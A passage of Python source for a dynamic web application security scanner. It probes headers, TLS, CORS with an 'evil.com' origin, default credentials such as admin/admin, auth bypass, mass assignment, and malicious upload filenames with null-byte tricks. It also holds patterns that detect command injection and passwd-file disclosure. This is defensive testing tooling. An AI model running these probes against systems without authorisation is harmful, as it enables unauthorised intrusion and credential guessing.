            "strict-transport-security",
            "x-frame-options",
            "referrer-policy",
            "permissions-policy"
        ]
        
        # User agents for testing
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "SecurityTestingBot/1.0"
        ]
        
        # File upload testing payloads
        self.file_upload_payloads = {
            "malicious_extensions": [
                "test.php", "test.jsp", "test.asp", "test.aspx",
                "test.exe", "test.bat", "test.sh", "test.py"
            ],
            "double_extensions": [
                "test.jpg.php", "test.png.jsp", "test.gif.asp"
            ],
            "null_byte": [
                "test.php%00.jpg", "test.jsp%00.png"
            ]
        }
    
    async def scan_web_application(self, target_url: str, include_api_testing: bool = True) -> List[SecurityFinding]:
        """Perform comprehensive DAST scan on web application."""
        findings = []
        
        try:
            logger.info(f"Starting comprehensive DAST scan on {target_url}")
            
            # Security headers analysis
            header_findings = await self._analyze_security_headers(target_url)
            findings.extend(header_findings)
            
            # SSL/TLS security analysis
            tls_findings = await self._analyze_tls_security(target_url)
            findings.extend(tls_findings)
            
            # Discovery phase
            endpoints = await self._discover_endpoints(target_url)
            
            # Technology fingerprinting
            tech_findings = await self._fingerprint_technologies(target_url)
            findings.extend(tech_findings)
            
            # Authentication testing
            auth_findings = await self._test_authentication(target_url)
            findings.extend(auth_findings)
            
            # Session management testing
            session_findings = await self._test_session_management(target_url)
            findings.extend(session_findings)
            
            # Vulnerability testing phase
            for endpoint in endpoints:
                endpoint_findings = await self._test_endpoint_comprehensive(target_url, endpoint)
                findings.extend(endpoint_findings)
            
            # API security testing
            if include_api_testing:
                api_findings = await self._test_api_security(target_url)
                findings.extend(api_findings)
            
            # Business logic testing
            logic_findings = await self._test_business_logic(target_url)
            findings.extend(logic_findings)
            
            logger.info(f"DAST scan completed: {len(findings)} findings for {target_url}")
            
        except Exception as e:
            logger.error(f"DAST scan failed for {target_url}: {e}")
            # Create error finding
            error_finding = SecurityFinding(
                title="DAST Scan Error",
                description=f"DAST scan encountered an error: {e}",
                severity=SecuritySeverity.MEDIUM,
                test_type=SecurityTestType.DAST,
                scan_target=target_url
            )
            findings.append(error_finding)
        
        return findings
    
    async def _discover_endpoints(self, base_url: str) -> List[str]:
        """Discover application endpoints."""
        discovered_endpoints = []
        
        # Test common endpoints
        async with aiohttp.ClientSession() as session:
            for endpoint in self.common_endpoints:
                try:
                    url = f"{base_url.rstrip('/')}{endpoint}"
                    async with session.get(url, timeout=10) as response:
                        if response.status < 400:
                            discovered_endpoints.append(endpoint)
                except Exception:
                    continue
        
        # Add root endpoint
        discovered_endpoints.append("/")
        
        return discovered_endpoints
    
    async def _test_endpoint_comprehensive(self, base_url: str, endpoint: str) -> List[SecurityFinding]:
        """Test individual endpoint comprehensively for vulnerabilities."""
        findings = []
        url = f"{base_url.rstrip('/')}{endpoint}"
        
        # Test different vulnerability types
        for vuln_type, payloads in self.test_payloads.items():
            vuln_findings = await self._test_vulnerability_type(url, vuln_type, payloads)
            findings.extend(vuln_findings)
        
        # Test HTTP methods
        method_findings = await self._test_http_methods(url)
        findings.extend(method_findings)
        
        # Test for CORS misconfigurations
        cors_findings = await self._test_cors_configuration(url)
        findings.extend(cors_findings)
        
        # Test for clickjacking
        clickjacking_findings = await self._test_clickjacking(url)
        findings.extend(clickjacking_findings)
        
        return findings
    
    async def _test_vulnerability_type(self, url: str, vuln_type: str, payloads: List[str]) -> List[SecurityFinding]:
        """Test for specific vulnerability type."""
        findings = []
        
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?test={payload}"
                    async with session.get(test_url, timeout=10) as response:
                        response_text = await response.text()
                        
                        if self._detect_vulnerability(vuln_type, payload, response_text, response.status):
                            finding = SecurityFinding(
                                title=f"Potential {vuln_type.replace('_', ' ').title()} via GET",
                                description=f"Detected potential {vuln_type} vulnerability in GET parameter",
                                severity=self._get_dast_severity(vuln_type),
                                vulnerability_type=vuln_type,
                                test_type=SecurityTestType.DAST,
                                test_tool="Custom DAST Engine",
                                scan_target=url,
                                evidence=[f"Payload: {payload}", f"Response Status: {response.status}"],
                                proof_of_concept=f"GET {test_url}",
                                cwe_id=self._get_cwe_for_vulnerability(vuln_type),
                                owasp_category=self._get_owasp_category(vuln_type),
                                remediation_guidance=self._get_dast_remediation(vuln_type)
                            )
                            findings.append(finding)
                    
                    # Test POST data
                    post_data = {"test": payload}
                    async with session.post(url, data=post_data, timeout=10) as response:
                        response_text = await response.text()
                        
                        if self._detect_vulnerability(vuln_type, payload, response_text, response.status):
                            finding = SecurityFinding(
                                title=f"Potential {vuln_type.replace('_', ' ').title()} via POST",
                                description=f"Detected potential {vuln_type} vulnerability in POST data",
                                severity=self._get_dast_severity(vuln_type),
                                vulnerability_type=vuln_type,
                                test_type=SecurityTestType.DAST,
                                test_tool="Custom DAST Engine",
                                scan_target=url,
                                evidence=[f"Payload: {payload}", f"Response Status: {response.status}"],
                                proof_of_concept=f"POST {url} with data: {post_data}",
                                cwe_id=self._get_cwe_for_vulnerability(vuln_type),
                                owasp_category=self._get_owasp_category(vuln_type),
                                remediation_guidance=self._get_dast_remediation(vuln_type)
                            )
                            findings.append(finding)
                
                except Exception as e:
                    logger.debug(f"DAST test failed for {url} with payload {payload}: {e}")
                    continue
        
        return findings
    
    def _detect_vulnerability(self, vuln_type: str, payload: str, response_text: str, status_code: int) -> bool:
        """Detect if vulnerability exists based on response."""
        detection_patterns = {
            "xss": [
                lambda p, r, s: p in r and "<script>" in p,
                lambda p, r, s: "alert('XSS')" in r,
                lambda p, r, s: "javascript:alert" in r
            ],
            "sql_injection": [
                lambda p, r, s: any(error in r.lower() for error in ["sql syntax", "mysql", "postgresql", "oracle", "sqlite"]),
                lambda p, r, s: "syntax error" in r.lower() and "'" in p,
                lambda p, r, s: s == 500 and "union" in p.lower()
            ],
            "command_injection": [
                lambda p, r, s: any(output in r for output in ["total ", "drwxr", "uid=", "gid="]),
                lambda p, r, s: "root:" in r and "passwd" in p,
                lambda p, r, s: "Directory of" in r and "dir" in p
            ],
            "path_traversal": [
                lambda p, r, s: "root:" in r and "../" in p,
                lambda p, r, s: "[users]" in r.lower() and "..\\" in p,
                lambda p, r, s: len(r) > 1000 and "../" in p
            ]
        }
        
        patterns = detection_patterns.get(vuln_type, [])
        return any(pattern(payload, response_text, status_code) for pattern in patterns)
    
    async def _test_http_methods(self, url: str) -> List[SecurityFinding]:
        """Test for dangerous HTTP methods."""
        findings = []
        dangerous_methods = ['TRACE', 'TRACK', 'DELETE', 'PUT', 'PATCH']
        
        async with aiohttp.ClientSession() as session:
            for method in dangerous_methods:
                try:
                    async with session.request(method, url, timeout=10) as response:
                        if response.status < 400:
                            finding = SecurityFinding(
                                title=f"Dangerous HTTP Method Enabled: {method}",
                                description=f"Server allows {method} method which may be dangerous",
                                severity=SecuritySeverity.MEDIUM,
                                vulnerability_type="dangerous_http_method",
                                test_type=SecurityTestType.DAST,
                                test_tool="HTTP Method Tester",
                                scan_target=url,
                                evidence=[f"Method: {method}", f"Status: {response.status}"],
                                remediation_guidance=f"Disable {method} method if not required"
                            )
                            findings.append(finding)
                except Exception:
                    continue
        
        return findings
    
    async def _test_cors_configuration(self, url: str) -> List[SecurityFinding]:
        """Test for CORS misconfigurations."""
        findings = []
        
        try:
            headers = {'Origin': 'https://evil.com'}
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=10) as response:
                    cors_header = response.headers.get('access-control-allow-origin')
                    
                    if cors_header == '*':
                        finding = SecurityFinding(
                            title="CORS Wildcard Misconfiguration",
                            description="Server allows requests from any origin using wildcard",
                            severity=SecuritySeverity.MEDIUM,
                            vulnerability_type="cors_misconfiguration",
                            test_type=SecurityTestType.DAST,
                            test_tool="CORS Analyzer",
                            scan_target=url,
                            evidence=[f"Access-Control-Allow-Origin: {cors_header}"],
                            remediation_guidance="Configure specific allowed origins instead of wildcard"
                        )
                        findings.append(finding)
                    
                    elif cors_header and 'evil.com' in cors_header:
                        finding = SecurityFinding(
                            title="CORS Origin Reflection",
                            description="Server reflects arbitrary origins in CORS headers",
                            severity=SecuritySeverity.HIGH,
                            vulnerability_type="cors_misconfiguration",
                            test_type=SecurityTestType.DAST,
                            test_tool="CORS Analyzer",
                            scan_target=url,
                            evidence=[f"Origin: evil.com", f"Reflected: {cors_header}"],
                            remediation_guidance="Implement proper origin validation for CORS"
                        )
                        findings.append(finding)
        
        except Exception as e:
            logger.debug(f"CORS test failed: {e}")
        
        return findings
    
    def _get_dast_severity(self, vuln_type: str) -> SecuritySeverity:
        """Get severity for DAST findings."""
        severity_mapping = {
            "xss": SecuritySeverity.MEDIUM,
            "sql_injection": SecuritySeverity.HIGH,
            "command_injection": SecuritySeverity.CRITICAL,
            "path_traversal": SecuritySeverity.HIGH,
            "xxe": SecuritySeverity.HIGH,
            "authentication_bypass": SecuritySeverity.CRITICAL,
            "cors_misconfiguration": SecuritySeverity.MEDIUM,
            "dangerous_http_method": SecuritySeverity.MEDIUM,
            "insecure_transport": SecuritySeverity.HIGH,
            "missing_security_header": SecuritySeverity.MEDIUM,
            "insecure_cookie": SecuritySeverity.MEDIUM
        }
        return severity_mapping.get(vuln_type, SecuritySeverity.INFO)
    
    async def _analyze_security_headers(self, target_url: str) -> List[SecurityFinding]:
        """Analyze security headers."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    headers = {k.lower(): v for k, v in response.headers.items()}
                    
                    for header in self.security_headers:
                        if header not in headers:
                            finding = SecurityFinding(
                                title=f"Missing Security Header: {header}",
                                description=f"Security header '{header}' is not present",
                                severity=SecuritySeverity.MEDIUM,
                                vulnerability_type="missing_security_header",
                                test_type=SecurityTestType.DAST,
                                test_tool="Security Header Analyzer",
                                scan_target=target_url,
                                evidence=[f"Missing header: {header}"],
                                remediation_guidance=self._get_header_remediation(header)
                            )
                            findings.append(finding)
                    
                    # Check for insecure header values
                    insecure_headers = self._check_insecure_header_values(headers)
                    findings.extend(insecure_headers)
        
        except Exception as e:
            logger.debug(f"Security header analysis failed: {e}")
        
        return findings
    
    async def _analyze_tls_security(self, target_url: str) -> List[SecurityFinding]:
        """Analyze TLS/SSL security configuration."""
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            if parsed_url.scheme != 'https':
                finding = SecurityFinding(
                    title="HTTP Protocol Used",
                    description="Application uses insecure HTTP protocol",
                    severity=SecuritySeverity.HIGH,
                    vulnerability_type="insecure_transport",
                    test_type=SecurityTestType.DAST,
                    test_tool="TLS Analyzer",
                    scan_target=target_url,
                    evidence=[f"URL scheme: {parsed_url.scheme}"],
                    remediation_guidance="Implement HTTPS with strong TLS configuration"
                )
                findings.append(finding)
                return findings
            
            # Test TLS configuration
            tls_findings = await self._test_tls_configuration(parsed_url.hostname, parsed_url.port or 443)
            findings.extend(tls_findings)
        
        except Exception as e:
            logger.debug(f"TLS security analysis failed: {e}")
        
        return findings
    
    async def _test_tls_configuration(self, hostname: str, port: int) -> List[SecurityFinding]:
        """Test TLS configuration details."""
        findings = []
        
        try:
            # Create SSL context to test various configurations
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    # Check TLS version
                    if ssock.version in ['TLSv1', 'TLSv1.1']:
                        finding = SecurityFinding(
                            title="Weak TLS Version",
                            description=f"Server supports weak TLS version: {ssock.version}",
                            severity=SecuritySeverity.HIGH,
                            vulnerability_type="weak_tls_version",
                            test_type=SecurityTestType.DAST,
                            test_tool="TLS Analyzer",
                            scan_target=f"{hostname}:{port}",
                            evidence=[f"TLS Version: {ssock.version}"],
                            remediation_guidance="Disable TLS 1.0 and 1.1, use TLS 1.2 or higher"
                        )
                        findings.append(finding)
                    
                    # Check cipher suite
                    cipher = ssock.cipher()
                    if cipher and self._is_weak_cipher(cipher[0]):
                        finding = SecurityFinding(
                            title="Weak Cipher Suite",
                            description=f"Server uses weak cipher: {cipher[0]}",
                            severity=SecuritySeverity.MEDIUM,
                            vulnerability_type="weak_cipher",
                            test_type=SecurityTestType.DAST,
                            test_tool="TLS Analyzer",
                            scan_target=f"{hostname}:{port}",
                            evidence=[f"Cipher: {cipher[0]}"],
                            remediation_guidance="Configure strong cipher suites with perfect forward secrecy"
                        )
                        findings.append(finding)
        
        except Exception as e:
            logger.debug(f"TLS configuration test failed: {e}")
        
        return findings
    
    def _is_weak_cipher(self, cipher_name: str) -> bool:
        """Check if cipher is considered weak."""
        weak_ciphers = [
            'RC4', 'DES', '3DES', 'MD5', 'SHA1',
            'NULL', 'EXPORT', 'LOW', 'MEDIUM'
        ]
        return any(weak in cipher_name.upper() for weak in weak_ciphers)
    
    def _get_header_remediation(self, header: str) -> str:
        """Get remediation guidance for missing security header."""
        remediation_map = {
            "content-security-policy": "Implement CSP to prevent XSS and data injection attacks",
            "x-frame-options": "Set X-Frame-Options to prevent clickjacking attacks",
            "x-content-type-options": "Set X-Content-Type-Options: nosniff to prevent MIME sniffing",
            "x-xss-protection": "Enable XSS protection in browsers",
            "strict-transport-security": "Implement HSTS to enforce HTTPS connections",
            "referrer-policy": "Configure referrer policy to control referrer information leakage"
        }
        return remediation_map.get(header, "Configure appropriate security header")
    
    def _check_insecure_header_values(self, headers: Dict[str, str]) -> List[SecurityFinding]:
        """Check for insecure security header values."""
        findings = []
        
        # Check CSP
        csp = headers.get('content-security-policy', '')
        if csp and 'unsafe-inline' in csp:
            finding = SecurityFinding(
                title="Insecure Content Security Policy",
                description="CSP allows unsafe-inline which reduces protection against XSS",
                severity=SecuritySeverity.MEDIUM,
                vulnerability_type="insecure_csp",
                test_type=SecurityTestType.DAST,
                test_tool="Security Header Analyzer",
                evidence=[f"CSP: {csp}"],
                remediation_guidance="Remove unsafe-inline from CSP and use nonces or hashes"
            )
            findings.append(finding)
        
        # Check X-Frame-Options
        xfo = headers.get('x-frame-options', '')
        if xfo and xfo.upper() not in ['DENY', 'SAMEORIGIN']:
            finding = SecurityFinding(
                title="Weak X-Frame-Options",
                description="X-Frame-Options set to insecure value",
                severity=SecuritySeverity.MEDIUM,
                vulnerability_type="weak_frame_options",
                test_type=SecurityTestType.DAST,
                test_tool="Security Header Analyzer",
                evidence=[f"X-Frame-Options: {xfo}"],
                remediation_guidance="Set X-Frame-Options to DENY or SAMEORIGIN"
            )
            findings.append(finding)
        
        return findings
    
    async def _fingerprint_technologies(self, target_url: str) -> List[SecurityFinding]:
        """Fingerprint web technologies."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    headers = response.headers
                    text = await response.text()
                    
                    # Check for technology disclosure in headers
                    tech_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator']
                    for header in tech_headers:
                        if header in headers:
                            finding = SecurityFinding(
                                title="Technology Disclosure",
                                description=f"Server discloses technology information in {header} header",
                                severity=SecuritySeverity.LOW,
                                vulnerability_type="information_disclosure",
                                test_type=SecurityTestType.DAST,
                                test_tool="Technology Fingerprinter",
                                scan_target=target_url,
                                evidence=[f"{header}: {headers[header]}"],
                                remediation_guidance="Remove or obfuscate technology disclosure headers"
                            )
                            findings.append(finding)
                    
                    # Check for technology disclosure in content
                    tech_signatures = [
                        (r'<meta name="generator" content="([^"]+)"', "Technology disclosed in meta tag"),
                        (r'Powered by ([\w\s\.]+)', "Technology disclosed in page content"),
                        (r'Built with ([\w\s\.]+)', "Framework disclosed in page content")
                    ]
                    
                    for pattern, description in tech_signatures:
                        matches = re.findall(pattern, text, re.IGNORECASE)
                        for match in matches:
                            finding = SecurityFinding(
                                title="Technology Disclosure in Content",
                                description=description,
                                severity=SecuritySeverity.LOW,
                                vulnerability_type="information_disclosure",
                                test_type=SecurityTestType.DAST,
                                test_tool="Technology Fingerprinter",
                                scan_target=target_url,
                                evidence=[f"Disclosed technology: {match}"],
                                remediation_guidance="Remove technology disclosure from page content"
                            )
                            findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Technology fingerprinting failed: {e}")
        
        return findings
    
    async def _test_authentication(self, target_url: str) -> List[SecurityFinding]:
        """Test authentication mechanisms."""
        findings = []
        
        # Test for common authentication endpoints
        auth_endpoints = ['/login', '/signin', '/auth', '/api/auth', '/api/login']
        
        for endpoint in auth_endpoints:
            auth_url = f"{target_url.rstrip('/')}{endpoint}"
            
            # Test authentication bypass
            bypass_findings = await self._test_auth_bypass(auth_url)
            findings.extend(bypass_findings)
            
            # Test for weak authentication
            weak_auth_findings = await self._test_weak_authentication(auth_url)
            findings.extend(weak_auth_findings)
        
        return findings
    
    async def _test_auth_bypass(self, auth_url: str) -> List[SecurityFinding]:
        """Test for authentication bypass vulnerabilities."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                for payload in self.auth_bypass_payloads:
                    # Test with different parameters
                    test_data = {
                        'username': payload,
                        'password': 'test'
                    }
                    
                    async with session.post(auth_url, data=test_data, timeout=10) as response:
                        response_text = await response.text()
                        
                        # Check for successful authentication indicators
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin']
                        if any(indicator in response_text.lower() for indicator in success_indicators):
                            finding = SecurityFinding(
                                title="Authentication Bypass",
                                description="Potential authentication bypass vulnerability detected",
                                severity=SecuritySeverity.CRITICAL,
                                vulnerability_type="authentication_bypass",
                                test_type=SecurityTestType.DAST,
                                test_tool="Authentication Tester",
                                scan_target=auth_url,
                                evidence=[f"Payload: {payload}", f"Response indicators: {success_indicators}"],
                                proof_of_concept=f"POST {auth_url} with username={payload}",
                                remediation_guidance="Implement proper authentication validation and sanitize all inputs"
                            )
                            findings.append(finding)
                            break  # Stop testing once bypass is found
        
        except Exception as e:
            logger.debug(f"Authentication bypass test failed: {e}")
        
        return findings
    
    async def _test_session_management(self, target_url: str) -> List[SecurityFinding]:
        """Test session management security."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as response:
                    # Check session cookie security
                    cookies = response.cookies
                    
                    for cookie in cookies.values():
                        # Check for insecure cookie attributes
                        if not cookie.get('secure'):
                            finding = SecurityFinding(
                                title="Insecure Cookie - Missing Secure Flag",
                                description="Session cookie lacks Secure flag",
                                severity=SecuritySeverity.MEDIUM,
                                vulnerability_type="insecure_cookie",
                                test_type=SecurityTestType.DAST,
                                test_tool="Session Analyzer",
                                scan_target=target_url,
                                evidence=[f"Cookie: {cookie.key}"],
                                remediation_guidance="Set Secure flag on all session cookies"
                            )
                            findings.append(finding)
                        
                        if not cookie.get('httponly'):
                            finding = SecurityFinding(
                                title="Insecure Cookie - Missing HttpOnly Flag",
                                description="Session cookie lacks HttpOnly flag",
                                severity=SecuritySeverity.MEDIUM,
                                vulnerability_type="insecure_cookie",
                                test_type=SecurityTestType.DAST,
                                test_tool="Session Analyzer",
                                scan_target=target_url,
                                evidence=[f"Cookie: {cookie.key}"],
                                remediation_guidance="Set HttpOnly flag on all session cookies"
                            )
                            findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Session management test failed: {e}")
        
        return findings
    
    async def _test_api_security(self, target_url: str) -> List[SecurityFinding]:
        """Test API-specific security vulnerabilities."""
        findings = []
        
        # Discover API endpoints
        api_endpoints = await self._discover_api_endpoints(target_url)
        
        for endpoint in api_endpoints:
            # Test for mass assignment
            mass_assignment_findings = await self._test_mass_assignment(endpoint)
            findings.extend(mass_assignment_findings)
            
            # Test for excessive data exposure
            data_exposure_findings = await self._test_excessive_data_exposure(endpoint)
            findings.extend(data_exposure_findings)
            
            # Test for rate limiting
            rate_limit_findings = await self._test_rate_limiting(endpoint)
            findings.extend(rate_limit_findings)
        
        return findings
    
    async def _discover_api_endpoints(self, target_url: str) -> List[str]:
        """Discover API endpoints."""
        api_endpoints = []
        
        # Common API paths
        api_paths = ['/api', '/v1', '/v2', '/rest', '/graphql', '/api/v1', '/api/v2']
        
        async with aiohttp.ClientSession() as session:
            for path in api_paths:
                try:
                    url = f"{target_url.rstrip('/')}{path}"
                    async with session.get(url, timeout=10) as response:
                        if response.status < 400:
                            api_endpoints.append(url)
                except Exception:
                    continue
        
        return api_endpoints
    
    async def _test_mass_assignment(self, api_url: str) -> List[SecurityFinding]:
        """Test for mass assignment vulnerabilities."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                for payload in self.api_payloads["mass_assignment"]:
                    headers = {'Content-Type': 'application/json'}
                    
                    async with session.post(api_url, data=payload, headers=headers, timeout=10) as response:
                        response_text = await response.text()
                        
                        # Check for signs of successful mass assignment
                        if response.status == 200 and ('admin' in response_text.lower() or 'role' in response_text.lower()):
                            finding = SecurityFinding(
                                title="Mass Assignment Vulnerability",
                                description="API endpoint vulnerable to mass assignment attack",
                                severity=SecuritySeverity.HIGH,
                                vulnerability_type="mass_assignment",
                                test_type=SecurityTestType.DAST,
                                test_tool="API Security Tester",
                                scan_target=api_url,
                                evidence=[f"Payload: {payload}", f"Response: {response_text[:200]}"],
                                proof_of_concept=f"POST {api_url} with payload: {payload}",
                                remediation_guidance="Implement proper input validation and use whitelisting for allowed parameters"
                            )
                            findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Mass assignment test failed: {e}")
        
        return findings
    
    def _get_dast_remediation(self, vuln_type: str) -> str:
        """Get comprehensive DAST-specific remediation guidance."""
        guidance_mapping = {
            "xss": "Implement Content Security Policy (CSP), use output encoding, validate and sanitize all user inputs, and use secure templating engines.",
            "sql_injection": "Use parameterized queries, stored procedures, and proper input validation. Implement least-privilege database access.",
            "command_injection": "Avoid system command execution with user input. Use safe APIs, implement input validation, and use sandboxed execution.",
            "path_traversal": "Implement proper path validation, use canonical path resolution, and enforce access controls.",
            "xxe": "Disable external entity processing, use secure XML parsers, and validate XML input structure.",
            "authentication_bypass": "Implement robust authentication mechanisms, use secure session management, and enforce proper access controls.",
            "insecure_transport": "Implement HTTPS with strong TLS configuration, use HSTS headers, and disable insecure protocols.",
            "missing_security_header": "Configure all required security headers to protect against common attacks.",
            "insecure_cookie": "Set Secure, HttpOnly, and SameSite flags on all cookies containing sensitive information.",
            "mass_assignment": "Implement input validation with parameter whitelisting and use proper data binding controls."
        }
        return guidance_mapping.get(vuln_type, "Implement comprehensive security controls and follow OWASP guidelines.")
    
    async def _test_weak_authentication(self, auth_url: str) -> List[SecurityFinding]:
        """Test for weak authentication mechanisms."""
        findings = []
        
        # Test common weak credentials
        weak_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for username, password in weak_creds:
                    test_data = {'username': username, 'password': password}
                    
                    async with session.post(auth_url, data=test_data, timeout=10) as response:
                        response_text = await response.text()
                        
                        # Check for successful login indicators
                        if (response.status == 200 and 
                            any(indicator in response_text.lower() for indicator in ['welcome', 'dashboard', 'logout'])):
                            
                            finding = SecurityFinding(
                                title="Weak Default Credentials",
                                description=f"System accepts weak credentials: {username}/{password}",
                                severity=SecuritySeverity.HIGH,
                                vulnerability_type="weak_credentials",
                                test_type=SecurityTestType.DAST,
                                test_tool="Authentication Tester",
                                scan_target=auth_url,
                                evidence=[f"Username: {username}", f"Password: {password}"],
                                remediation_guidance="Change default credentials and enforce strong password policy"
                            )
                            findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Weak authentication test failed: {e}")
        
        return findings
    
    async def _test_excessive_data_exposure(self, api_url: str) -> List[SecurityFinding]:
        """Test for excessive data exposure in API responses."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=10) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for sensitive data patterns
                        sensitive_patterns = [
                            (r'password["\']:\s*["\'][^"\']+["\']', "Password exposed in response"),
                            (r'secret["\']:\s*["\'][^"\']+["\']', "Secret exposed in response"),
                            (r'api[_-]?key["\']:\s*["\'][^"\']+["\']', "API key exposed in response"),
                            (r'ssn["\']:\s*["\'][^"\']+["\']', "SSN exposed in response"),
                            (r'credit[_-]?card["\']:\s*["\'][^"\']+["\']', "Credit card data exposed")
                        ]
                        
                        for pattern, description in sensitive_patterns:
                            if re.search(pattern, response_text, re.IGNORECASE):
                                finding = SecurityFinding(
                                    title="Excessive Data Exposure",
                                    description=description,
                                    severity=SecuritySeverity.HIGH,
                                    vulnerability_type="data_exposure",
                                    test_type=SecurityTestType.DAST,
                                    test_tool="API Security Tester",
                                    scan_target=api_url,
                                    evidence=[f"Pattern found: {pattern}"],
                                    remediation_guidance="Remove sensitive data from API responses and implement data filtering"
                                )
                                findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Data exposure test failed: {e}")
        
        return findings
    
    async def _test_rate_limiting(self, api_url: str) -> List[SecurityFinding]:
        """Test for rate limiting implementation."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                # Send multiple rapid requests
                requests_sent = 0
                successful_requests = 0
                
                for _ in range(20):  # Send 20 rapid requests
                    try:
                        async with session.get(api_url, timeout=5) as response:
                            requests_sent += 1
                            if response.status < 400:
                                successful_requests += 1
                    except Exception:
                        break
                
                # If most requests succeeded, rate limiting may not be implemented
                success_rate = successful_requests / requests_sent if requests_sent > 0 else 0
                
                if success_rate > 0.8:  # More than 80% success rate indicates no rate limiting
                    finding = SecurityFinding(
                        title="Missing Rate Limiting",
                        description="API endpoint does not implement rate limiting",
                        severity=SecuritySeverity.MEDIUM,
                        vulnerability_type="missing_rate_limiting",
                        test_type=SecurityTestType.DAST,
                        test_tool="API Security Tester",
                        scan_target=api_url,
                        evidence=[f"Successful requests: {successful_requests}/{requests_sent}"],
                        remediation_guidance="Implement rate limiting to prevent abuse and DoS attacks"
                    )
                    findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Rate limiting test failed: {e}")
        
        return findings
    
    async def _test_business_logic(self, target_url: str) -> List[SecurityFinding]:
        """Test for business logic vulnerabilities."""
        findings = []
        
        # Test for common business logic issues
        business_logic_tests = [
            self._test_price_manipulation,
            self._test_quantity_manipulation,
            self._test_workflow_bypass
        ]
        
        for test_func in business_logic_tests:
            try:
                test_findings = await test_func(target_url)
                findings.extend(test_findings)
            except Exception as e:
                logger.debug(f"Business logic test failed: {e}")
        
        return findings
    
    async def _test_price_manipulation(self, target_url: str) -> List[SecurityFinding]:
        """Test for price manipulation vulnerabilities."""
        findings = []
        
        # Look for endpoints that might handle pricing
        price_endpoints = ['/cart', '/order', '/checkout', '/payment']
        
        for endpoint in price_endpoints:
            test_url = f"{target_url.rstrip('/')}{endpoint}"
            
            try:
                # Test negative prices
                test_data = {'price': '-100', 'amount': '-50'}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(test_url, data=test_data, timeout=10) as response:
                        if response.status == 200:
                            response_text = await response.text()
                            
                            # Check if negative values were accepted
                            if 'success' in response_text.lower() or 'confirmed' in response_text.lower():
                                finding = SecurityFinding(
                                    title="Price Manipulation Vulnerability",
                                    description="Application accepts negative price values",
                                    severity=SecuritySeverity.HIGH,
                                    vulnerability_type="price_manipulation",
                                    test_type=SecurityTestType.DAST,
                                    test_tool="Business Logic Tester",
                                    scan_target=test_url,
                                    evidence=[f"Negative price accepted: {test_data}"],
                                    remediation_guidance="Implement server-side price validation and business logic controls"
                                )
                                findings.append(finding)
            
            except Exception as e:
                logger.debug(f"Price manipulation test failed for {test_url}: {e}")
        
        return findings
    
    async def _test_quantity_manipulation(self, target_url: str) -> List[SecurityFinding]:
        """Test for quantity manipulation vulnerabilities."""
        findings = []
        
        # Similar implementation to price manipulation
        # Testing for accepting invalid quantities (negative, zero, extremely large)
        return findings
    
    async def _test_workflow_bypass(self, target_url: str) -> List[SecurityFinding]:
        """Test for workflow bypass vulnerabilities."""
        findings = []
        
        # Test accessing endpoints in wrong order or skipping steps
        return findings
    
    async def _test_clickjacking(self, url: str) -> List[SecurityFinding]:
        """Test for clickjacking vulnerabilities."""
        findings = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    headers = response.headers
                    
                    # Check for X-Frame-Options header
                    xfo = headers.get('x-frame-options')
                    csp = headers.get('content-security-policy', '')
                    
                    vulnerable = False
                    
                    if not xfo and 'frame-ancestors' not in csp:
                        vulnerable = True
                        evidence = ["No X-Frame-Options header", "No frame-ancestors in CSP"]
                    elif xfo and xfo.upper() not in ['DENY', 'SAMEORIGIN']:
                        vulnerable = True
                        evidence = [f"Weak X-Frame-Options: {xfo}"]
                    
                    if vulnerable:
                        finding = SecurityFinding(
                            title="Clickjacking Vulnerability",
                            description="Page can be embedded in frames, potentially enabling clickjacking attacks",
                            severity=SecuritySeverity.MEDIUM,
                            vulnerability_type="clickjacking",
                            test_type=SecurityTestType.DAST,
                            test_tool="Clickjacking Tester",
                            scan_target=url,
                            evidence=evidence,
                            remediation_guidance="Set X-Frame-Options to DENY/SAMEORIGIN or use CSP frame-ancestors directive"
                        )
                        findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Clickjacking test failed: {e}")
        
        return findings


class VulnerabilityScanner:
    """Vulnerability assessment and management system."""
    
    def __init__(self):
        """Initialize vulnerability scanner."""
        self.known_vulnerabilities = {}
        self.severity_weights = {
            SecuritySeverity.CRITICAL: 10,
            SecuritySeverity.HIGH: 7,
            SecuritySeverity.MEDIUM: 4,
            SecuritySeverity.LOW: 1,
            SecuritySeverity.INFO: 0
        }
    
    async def scan_dependencies(self, target_path: str) -> List[SecurityFinding]:
        """Scan dependencies for known vulnerabilities."""
        findings = []
        target = Path(target_path)
        
        # Scan different dependency files
